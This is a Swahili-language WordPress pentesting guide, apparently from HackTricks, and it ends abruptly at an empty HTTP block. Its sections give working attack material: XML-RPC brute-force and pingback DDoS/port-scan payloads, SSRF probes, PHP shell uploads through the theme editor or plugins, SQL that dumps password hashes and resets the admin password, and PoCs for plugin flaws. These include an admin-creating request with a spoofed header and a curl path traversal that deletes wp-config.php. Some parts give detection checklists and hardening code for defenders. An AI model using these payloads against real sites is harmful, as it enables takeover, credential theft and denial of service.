# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

- **Uploaded** faili zinaenda kwa: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Files za theme zinaweza kupatikana katika /wp-content/themes/,** hivyo ukibadilisha php ya theme ili kupata RCE huenda utatumia path hiyo. Kwa mfano: Kwa kutumia **theme twentytwelve** unaweza **kupata** faili **404.php** katika: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **URL nyingine yenye msaada inaweza kuwa:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Katika **wp-config.php** unaweza kupata root password ya database.
- Njia za kawaida za kuingia za kukagua: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Faili Muhimu za WordPress**

- `index.php`
- `license.txt` ina taarifa muhimu kama toleo la WordPress lililosakinishwa.
- `wp-activate.php` inatumika kwa mchakato wa uanzishaji wa email wakati wa kusanidi tovuti mpya ya WordPress.
- Folda za login (zinaweza kubadilishwa jina ili kuzificha):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ni faili inayoonyesha kipengele cha WordPress kinachowawezesha data kutumwa kwa HTTP kama njia ya usafirishaji na XML kama njia ya kubandika. Aina hii ya mawasiliano imebadilishwa na WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folda ya `wp-content` ni saraka kuu ambapo plugins na themes zimehifadhiwa.
- `wp-content/uploads/` ni saraka ambapo faili zote zilizopakiwa kwenye jukwaa zinahifadhiwa.
- `wp-includes/` ni saraka ambayo faili za msingi zinahifadhiwa, kama certificates, fonts, faili za JavaScript, na widgets.
- `wp-sitemap.xml` Katika versions za WordPress 5.5 na zaidi, WordPress inazalisha faili ya sitemap XML yenye machapisho yote ya umma na aina za machapisho na taxonomies zinazoweza kuulizwa kwa umma.

**Post exploitation**

- Faili ya `wp-config.php` ina taarifa zinazohitajika na WordPress kuunganishwa na database kama jina la database, database host, username na password, authentication keys na salts, na prefix ya jedwali la database. Faili hii ya usanidi pia inaweza kutumika kuwasha DEBUG mode, ambayo inaweza kuwa ya msaada katika kutatua matatizo.

### Ruhusa za Watumiaji

- **Administrator**
- **Editor**: Kuchapisha na kusimamia machapisho yake na ya wengine
- **Author**: Kuchapisha na kusimamia machapisho yake mwenyewe
- **Contributor**: Kuandika na kusimamia machapisho yake lakini hawezi kuyachapisha
- **Subscriber**: Kuangalia machapisho na kuhariri wasifu wao

## **Passive Enumeration**

### **Pata toleo la WordPress**

Angalia kama unaweza kupata faili `/license.txt` au `/readme.html`

Ndani ya **source code** ya ukurasa (mfano kutoka kwa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Mafaili ya link za CSS

![](<../../images/image (533).png>)

- Mafaili ya JavaScript

![](<../../images/image (524).png>)

### Pata Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pata Mandhari
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Chota matoleo kwa ujumla
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Uorodheshaji hai

### Plugins and Themes

Huenda hautaweza kupata Plugins and Themes zote zinazowezekana. Ili kugundua zote, utahitaji **actively Brute Force a list of Plugins and Themes** (kwa bahati nzuri kwetu kuna zana za kiotomatiki zinazojumuisha orodha hizi).

### Watumiaji

- **ID Brute:** Unapata watumiaji halali kutoka kwenye tovuti ya WordPress kwa Brute Forcing users IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Kama majibu ni **200** au **30X**, hiyo ina maana id ni **halali**. Ikiwa jibu ni **400**, basi id ni **batili**.

- **wp-json:** Unaweza pia kujaribu kupata taarifa kuhusu watumiaji kwa kuuliza:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Endpoint nyingine ya `/wp-json/` ambayo inaweza kufichua baadhi ya taarifa kuhusu watumiaji ni:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Kumbuka kuwa endpoint hii inaonyesha tu watumiaji waliotengeneza chapisho. **Taarifa zitolewazo ni za watumiaji tu ambao kipengele hiki kimewezeshwa**.

Pia kumbuka kwamba **/wp-json/wp/v2/pages** inaweza leak anwani za IP.

- **Login username enumeration**: Unapojaribu kuingia kwenye **`/wp-login.php`** **ujumbe** hutofautiana — unaonyesha kama **username** ipo au la.

### XML-RPC

Ikiwa `xml-rpc.php` ni active unaweza kufanya credentials brute-force au kuitumia kuzindua DoS attacks dhidi ya rasilimali nyingine. (Unaweza otomatisha mchakato huu[ using this](https://github.com/relarizky/wpxploit) kwa mfano).

Ili kuona ikiwa imewekwa active jaribu kufikia _**/xmlrpc.php**_ na tuma ombi hili:

**Angalia**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** au **`metaWeblog.getUsersBlogs`** ni baadhi ya mbinu zinazoweza kutumika kwa brute-force credentials. Ikiwa unaweza kupata yoyote kati yao unaweza kutuma kitu kama:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Ujumbe _"Jina la mtumiaji au nenosiri si sahihi"_ ndani ya jibu la code 200 unapaswa kuonekana ikiwa maelezo ya kuingia si sahihi.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Kwa kutumia maelezo ya kuingia sahihi unaweza kupakia faili. Katika jibu njia itaonekana ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Pia kuna njia **haraka zaidi** ya brute-force credentials kwa kutumia **`system.multicall`**, kwani unaweza kujaribu credentials kadhaa katika ombi moja:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Mbinu hii imekusudiwa kwa programu na si kwa watu, na ni ya zamani, hivyo haiungi mkono 2FA. Kwa hivyo, kama una creds halali lakini lango kuu limehifadhiwa kwa 2FA, **unaweza kuweza kutumia xmlrpc.php kuingia na hayo creds ukiepuka 2FA**. Kumbuka hautaweza kufanya vitendo vyote unavyoweza kupitia console, lakini bado unaweza kufikia RCE kama Ippsec anavyoeleza katika [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS au port scanning**

Ikiwa unaweza kupata method _**pingback.ping**_ ndani ya orodha unaweza kufanya Wordpress itume ombi lolote kwa host/port yoyote.\
Hii inaweza kutumika kuomba **maelfu** ya Wordpress **sites** ziweze **access** eneo moja (hivyo kusababisha **DDoS** katika eneo hilo) au unaweza kuitumia kufanya **Wordpress** scan baadhi ya mtandao wa ndani (unaweza kuonyesha port yoyote).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ikiwa unapokea **faultCode** yenye thamani **kubwa kuliko** **0** (17), ina maana port iko wazi.

Angalia matumizi ya **`system.multicall`** katika sehemu iliyopita ili ujifunze jinsi ya kutumia vibaya njia hii kusababisha DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Faili hii kawaida huwa kwenye mzizi wa tovuti ya Wordpress: **`/wp-cron.php`**\
Wakati faili hii inapo **accessed** hufanywa "**heavy**" MySQL **query**, hivyo inaweza kutumika na **attackers** kusababisha **DoS**.\
Zaidi ya hayo, kwa default, `wp-cron.php` huwa inaitwa kila upakiaji wa ukurasa (wakati wowote client anapohitaji ukurasa wowote wa Wordpress), ambayo katika tovuti zenye trafiki kubwa inaweza kusababisha matatizo (DoS).

Inapendekezwa kuzima Wp-Cron na kuunda cronjob halisi ndani ya host inayotekeleza vitendo vinavyohitajika kwa vipindi vya kawaida (bila kusababisha matatizo).

### /wp-json/oembed/1.0/proxy - SSRF

Jaribu kufikia _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ na Worpress site inaweza kutuma ombi kwako.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Zana hii huangalia kama **methodName: pingback.ping** na kwa path **/wp-json/oembed/1.0/proxy** na ikiwa ipo, inajaribu ku-exploit yao.

## Zana za Kiotomatiki
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Kupata ufikiaji kwa kubadilisha bit

Hii ni zaidi ya shambulio halisi; ni jambo la udadisi. Katika CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man] unaweza kubadilisha bit 1 kutoka kwenye faili yoyote ya wordpress. Kwa hivyo unaweza kubadili nafasi `5389` ya faili `/var/www/html/wp-includes/user.php` ili kuifanya operesheni ya NOT (`!`) kuwa NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **RCE ya Paneli**

**Badilisha php kutoka kwenye theme inayotumika (inahitaji admin credentials)**

Appearance → Theme Editor → 404 Template (kwa upande wa kulia)

Badilisha yaliyomo kwa php shell:

![](<../../images/image (384).png>)

Tafuta kwenye intaneti jinsi unavyoweza kufikia ukurasa huo uliosasishwa. Katika kesi hii lazima utembelee hapa: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Unaweza kutumia:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
kupata session.

## Plugin RCE

### PHP plugin

Inawezekana kupakia .php files kama plugin.\
Tengeneza php backdoor yako kwa kutumia, kwa mfano:

![](<../../images/image (183).png>)

Kisha ongeza plugin mpya:

![](<../../images/image (722).png>)

Pakia plugin na bonyeza Install Now:

![](<../../images/image (249).png>)

Bonyeza Procced:

![](<../../images/image (70).png>)

Inaonekana hii haitafanya chochote, lakini ukichagua Media, utaona shell yako imepakiwa:

![](<../../images/image (462).png>)

Fikia faili hiyo na utaona URL ya kutekeleza reverse shell:

![](<../../images/image (1006).png>)

### Kupakia na kuamsha plugin hatari

Njia hii inahusisha usakinishaji wa plugin hatari inayojulikana kuwa na udhaifu na inaweza kutumika kupata web shell. Mchakato huu unafanywa kupitia WordPress dashboard kama ifuatavyo:

1. **Plugin Acquisition**: Plugin hupatikana kutoka chanzo kama Exploit DB kama [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Nenda kwenye WordPress dashboard, kisha nenda `Dashboard > Plugins > Upload Plugin`.
- Upload zip file ya plugin uliopakua.
3. **Plugin Activation**: Mara plugin inapowekwa kwa mafanikio, lazima iamshwe kupitia dashboard.
4. **Exploitation**:
- Ukiwa na plugin "reflex-gallery" imewekwa na kuiamsha, inaweza kutumika kwa sababu inajulikana kuwa na udhaifu.
- Metasploit framework inatoa exploit kwa udhaifu huu. Kwa kupakia module inayofaa na kutekeleza amri maalum, session ya meterpreter inaweza kuanzishwa, ikitoa ufikaji usioidhinishwa kwenye tovuti.
- Inafahamika kuwa hii ni mojawapo tu ya njia nyingi za kutumia udhaifu kwenye tovuti ya WordPress.

Yaliyomo yanajumuisha msaada wa kuona unaoonyesha hatua kwenye WordPress dashboard za kusakinisha na kuamsha plugin. Hata hivyo, ni muhimu kutambua kwamba kutumia udhaifu kwa njia hii ni kinyume cha sheria na haifuli maadili bila ruhusa sahihi. Taarifa hizi zitatumika kwa uwajibikaji na tu katika muktadha wa kisheria, kama pentesting na idhini wazi.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Kutoka XSS hadi RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ni script iliyoundwa kuinua udhaifu wa **Cross-Site Scripting (XSS)** hadi **Remote Code Execution (RCE)** au udhaifu mwingine wa hatari katika WordPress. Kwa habari zaidi angalia [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Inatoa **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Inaunda user katika WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload custom plugin yako (backdoor) kwenye WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Hariri Built-In Plugins katika WordPress.
- _**(RCE) Built-In Theme Edit:**_ Hariri Built-In Themes katika WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits kwa Third-Party WordPress Plugins/Themes.

## Post Exploitation

Toa majina ya watumiaji na nywila:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Badilisha admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Kujua jinsi plugin ya Wordpress inaweza kuonyesha functionality ni muhimu ili kupata vulnerabilities kwenye kazi zake. Unaweza kuona jinsi plugin inaweza kuonyesha functionality katika vidokezo vifuatavyo na baadhi ya mifano ya plugins zilizo na udhaifu katika [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Moja ya njia ambazo plugin inaweza kuonyesha functions kwa watumiaji ni kupitia AJAX handlers. Hizi zinaweza kuwa na bug za logic, authorization, au authentication. Zaidi ya hayo, mara nyingi functions hizi zinategemea authentication na authorization kwa kuwepo kwa wordpress nonce ambayo **mtumiaji yeyote aliye authenticated katika instance ya Wordpress anaweza kuwa nayo** (bila kujali role yake).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Matumizi ya `nopriv` hufanya endpoint ipatikane kwa watumiaji wote (hata wale wasiothibitishwa).**

> [!CAUTION]
> Zaidi ya hayo, ikiwa function inacheki tu idhini ya mtumiaji kwa kutumia `wp_verify_nonce`, function hii inabaini tu kwamba mtumiaji ameingia katika mfumo; kawaida haicheki jukumu (role) la mtumiaji. Kwa hivyo watumiaji wenye vibali vidogo wanaweza kupata ufikiaji wa vitendo vyenye vibali vya juu.

- **REST API**

Inawezekana pia kufichua functions kutoka wordpress kwa kusajili REST API kwa kutumia function `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ni callback ya function inayokagua kama mtumiaji fulani ameidhinishwa kuita wito wa method ya API.

**Ikiwa function ya built-in `__return_true` itatumika, itapuuza ukaguzi wa ruhusa za mtumiaji.**

- **Direct access to the php file**

Bila shaka, Wordpress inatumia PHP na faili ndani ya plugins zinaweza kupatikana moja kwa moja kutoka kwenye web. Hivyo, ikiwa plugin inaonyesha functionality yoyote yenye udhaifu ambayo inachochewa kwa kuingilia tu faili, itakuwa inaweza kutumika na mtumiaji yeyote.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

Baadhi ya plugins hutekeleza “trusted header” shortcuts kwa ajili ya internal integrations au reverse proxies na kisha hutumia header hiyo kuweka muktadha wa mtumiaji wa sasa kwa REST requests. Ikiwa header hiyo haijafungamanishwa kwa cryptographically kwenye request na sehemu ya upstream, mshambuliaji anaweza ku-spoof na kufikia privileged REST routes kama administrator.

- Impact: kuongezeka kwa privilage bila uthibitisho hadi admin kwa kuunda administrator mpya kupitia core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (inalazimisha user ID 1, kawaida akaunti ya kwanza ya administrator).
- Exploited route: `POST /wp-json/wp/v2/users` na array ya role iliyoinuliwa.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Kwa nini inafanya kazi

- Plugin inamezea header inayodhibitiwa na mteja kwa hali ya authentication na inaruka ukaguzi wa capabilities.
- WordPress core inatarajia capability ya `create_users` kwa route hii; plugin hack inaitwepuka kwa kuweka moja kwa moja context ya current user kutoka kwa header.

Viuashiria vya mafanikio yanayotarajiwa

- HTTP 201 na body ya JSON inayoelezea user iliyoundwa.
- Admin user mpya inaonekana katika `wp-admin/users.php`.

Orodha ya ukaguzi wa kugundua

- Grep kwa `getallheaders()`, `$_SERVER['HTTP_...']`, au vendor SDKs zinazosomea headers maalum kuweka user context (mfano, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Kagua REST registrations kwa privileged callbacks ambazo hazina ukaguzi madhubuti wa `permission_callback` na badala yake zinategemea request headers.
- Angalia matumizi ya core user-management functions (`wp_insert_user`, `wp_create_user`) ndani ya REST handlers ambazo zinalindwa tu kwa thamani za header.

Kuimarisha

- Usitoke uthibitisho au idhini kutoka kwa headers zinazodhibitiwa na mteja.
- Ikiwa reverse proxy lazima iingize identity, iweke mwisho wa kuamini kwenye proxy na ifute nakala za inbound (mfano, `unset X-Wcpay-Platform-Checkout-User` kwenye edge), kisha pita token iliyosainiwa na iverify server-side.
- Kwa REST routes zinazofanya vitendo vya privileged, inahitaji ukaguzi wa `current_user_can()` na `permission_callback` kali (USITUMIE `__return_true`).
- Tilie more first-party auth (cookies, application passwords, OAuth) badala ya “impersonation” kupitia headers.

References: angalia viungo mwishoni mwa ukurasa huu kwa kesi ya umma na uchambuzi mpana.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes na plugins mara nyingi huonyesha AJAX handlers kupitia `wp_ajax_` na `wp_ajax_nopriv_` hooks. Wakati toleo la **_nopriv_** linapotumika **callback inafikiwa na wageni wasio na uthibitisho**, hivyo kitendo chochote chenye siri kinapaswa kutekeleza pia:

1. Ukaguzi wa **capability** (mfano `current_user_can()` au angalau `is_user_logged_in()`), na
2. CSRF nonce iliyo validated na `check_ajax_referer()` / `wp_verify_nonce()`, na
3. Uwekaji wazi wa usafi / uthibitishaji wa pembejeo.

The Litho multipurpose theme (< 3.1) alisahau udhibiti huo wa 3 katika kipengele cha *Remove Font Family* na hatimaye ilisambaza code ifuatayo (imefupishwa):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Masuala yaliyotokana na kipande hiki:

* **Unauthenticated access** – `wp_ajax_nopriv_` hook imejisajili.
* **No nonce / capability check** – mgeni yeyote anaweza kufikia endpoint.
* **No path sanitisation** – kamba ya `fontfamily` inayodhibitiwa na mtumiaji imeunganishwa kwenye filesystem path bila kuchujwa, ikiruhusu classic `../../` traversal.

#### Utekelezaji

Mshambuliaji anaweza kufuta faili au saraka yoyote **chini ya uploads base directory** (kawaida `<wp-root>/wp-content/uploads/`) kwa kutuma ombi moja la HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Kwa sababu `wp-config.php` iko nje ya *uploads*, mfululizo wa `../` mara nne unatosha kwenye ufungaji wa chaguo-msingi. Kufuta `wp-config.php` kunalazimisha WordPress kuingia kwenye *musaidizi wa usakinishaji* kwenye ziara inayofuata, kuruhusu kunyongwa kwa tovuti kwa ukamilifu (mshambuliaji anatakiwa tu kutoa usanidi mpya wa DB na kuunda mtumiaji admin).

Madhumuni mengine yenye athari ni pamoja na plugin/theme `.php` files (kwa kuvunja security plugins) au sheria za `.htaccess`.

#### Orodha ya kugundua

* Kila callback ya `add_action( 'wp_ajax_nopriv_...')` inayokiita filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, n.k.).
* Kuunganisha pembejeo za mtumiaji zisizosafishwa ndani ya paths (tafuta `$_POST`, `$_GET`, `$_REQUEST`).
* Ukosefu wa `check_ajax_referer()` na `current_user_can()`/`is_user_logged_in()`.

#### Kuimarisha
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Daima** chukulia operesheni yoyote ya kuandika/kufuta kwenye disk kama yenye ruhusa ya juu na hakikisha mara mbili:
> • Uthibitishaji  • Uidhinishaji  • Nonce  • Usafishaji wa ingizo  • Ushikaji wa njia (kwa mfano kupitia `realpath()` pamoja na `str_starts_with()`).

---

### Kuongezeka kwa ruhusa kupitia urejeshaji wa role zilizo zamani na kukosa uidhinishaji (ASE "View Admin as Role")

Plugins nyingi hufanya utekelezaji wa kipengele cha "view as role" au kubadilisha role kwa muda kwa kuhifadhi role za awali kwenye user meta ili ziweze kurejeshwa baadaye. Ikiwa njia ya urejeshaji inategemea tu vigezo vya ombi (kwa mfano, `$_REQUEST['reset-for']`) na orodha inayotunzwa na plugin bila kukagua capabilities na nonce halali, hili linageuka kuwa kuongezeka kwa ruhusa kwa wima.

Mfano wa ulimwengu halisi ulipatikana kwenye plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). Tawi la reset liliirejesha role kulingana na `reset-for=<username>` ikiwa jina la mtumiaji liligundika kwenye array ya ndani `$options['viewing_admin_as_role_are']`, lakini halikufanya ukaguzi wa `current_user_can()` wala uthibitisho wa nonce kabla ya kuondoa role za sasa na kuziweka tena role zilizohifadhiwa kutoka user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Kwa nini inaweza kutumiwa

- Inatumaini `$_REQUEST['reset-for']` na chaguo la plugin bila idhinisho upande wa server.
- Iwapo mtumiaji awali alikuwa na vibali vya juu vilivyohifadhiwa katika `_asenha_view_admin_as_original_roles` na alishushwa hadhi, anaweza kuvirudisha kwa kufikia njia ya reset.
- Katika baadhi ya mifumo, mtumiaji yeyote aliyethibitishwa anaweza kusababisha reset kwa jina la mtumiaji mwingine linaloendelea kuwepo katika `viewing_admin_as_role_are` (idhinishaji lililoharibika).

Mahitaji ya shambulio

- Toleo la plugin lenye udhaifu na kipengele kimewezeshwa.
- Akaunti lengwa ina role ya juu iliyosalia iliyohifadhiwa katika user meta kutoka matumizi ya awali.
- Kikao chochote kilicho thibitishwa; kutokuwepo kwa nonce/capability kwenye mtiririko wa reset.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Kwenye builds zilizo hatarini hili huondoa roles za sasa na kuzirudisha roles za asili zilizohifadhiwa (kwa mfano, `administrator`), kwa ufanisi kuongeza ruhusa.

Detection checklist

- Angalia vipengele vya kubadilisha role ambavyo vinahifadhi “original roles” katika user meta (mf., `_asenha_view_admin_as_original_roles`).
- Tambua njia za reset/restore ambazo:
- Kusoma majina ya watumiaji kutoka `$_REQUEST` / `$_GET` / `$_POST`.
- Kubadilisha roles kupitia `add_role()` / `remove_role()` bila `current_user_can()` na `wp_verify_nonce()` / `check_admin_referer()`.
- Kuidhinishwa kwa msingi wa array ya chaguo la plugin (mf., `viewing_admin_as_role_are`) badala ya uwezo wa mhusika.

Hardening

- Lazimisha ukaguzi wa uwezo kwenye kila tawi linalobadilisha hali (mf., `current_user_can('manage_options')` au kali zaidi).
- Lazimisha nonces kwa mabadiliko yote ya role/permission na uyathibitishe: `check_admin_referer()` / `wp_verify_nonce()`.
- Usiwamini kamwe majina ya watumiaji yanayotolewa kupitia request; tatua mtumiaji lengwa upande wa server kulingana na mhusika aliyethibitishwa na sera wazi.
- Batilisha hali ya “original roles” wakati wa masasisho ya profile/role ili kuepuka urejeshaji wa ruhusa za juu zilizochakaa:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Fikiria kuhifadhi minimal state na kutumia time-limited, capability-guarded tokens kwa temporary role switches.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Baadhi ya plugins huunganisha user-switching helpers kwenye public `init` hook na hupata utambulisho kutoka kwa client-controlled cookie. Ikiwa code inapiga simu `wp_set_auth_cookie()` bila kuthibitisha authentication, capability na nonce halali, mgeni yeyote asiye na uthibitisho anaweza kulazimisha login kama user ID yoyote.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Kwa nini inaweza kutumiwa

- Hook ya umma ya `init` inafanya handler kupatikana kwa unauthenticated users (hakuna `is_user_logged_in()` guard).
- Utambulisho unatokana na cookie inayoweza kubadilishwa na client (`original_user_id`).
- Mwito wa moja kwa moja wa `wp_set_auth_cookie($uid)` unaingia muombaji kama mtumiaji huyo bila ukaguzi wowote wa capability/nonce checks.

Exploitation (unauthenticated)
```http
